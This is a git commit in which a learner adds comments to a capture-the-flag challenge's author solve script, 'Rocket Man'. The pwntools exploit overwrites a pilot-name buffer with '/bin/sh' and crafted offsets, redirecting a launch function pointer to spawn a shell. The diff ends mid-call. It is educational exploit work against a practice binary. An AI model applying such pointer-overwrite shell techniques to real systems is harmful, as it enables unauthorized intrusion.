faad8407e490bd02eb7f538c0d86af4e3245c533
absurdtiger <jodietheteo@gmail.com>
2022-06-23 11:07:21 +0800

    added author's solve

--- PWN/Rocket Man/author_solve.py
+++ PWN/Rocket Man/author_solve.py
@@ -1,5 +1,9 @@
 #!/usr/bin/env python3
 
+'''
+comments are made by me for understanding the exploit, not by the author (niktay)
+'''
+
 from pwn import *
 
 HOST = "localhost"
@@ -22,12 +26,12 @@ else:
 def order_rocket():
     io.sendlineafter(CHOICE_PROMPT, b"1")
 
-
+# sets a name for the pilot, with the name as "test"
 def get_license(name: bytes = b"test"):
     io.sendlineafter(CHOICE_PROMPT, b"2")
     io.sendlineafter(PILOT_NAME_PROMPT, name)
 
-
+# longer way to call get_license()
 def update_name(name: bytes):
     get_license(name)
 
@@ -36,11 +40,11 @@ def launch_rocket():
     io.sendlineafter(CHOICE_PROMPT, b"3")
 
 
-get_license()
-order_rocket()
+get_license() #first setting the name as test
+order_rocket() # getting a rocket
 update_name(
     fit(
-        b"/bin/sh\x00",
+        b"/bin/sh\x00", # set name to /bin/sh
         {
             ROCKET_SIZE_OFFSET: 0x51,
             LAUNCH_FUNCTION_OFFSET: elf.sym.for_internal_use_only,
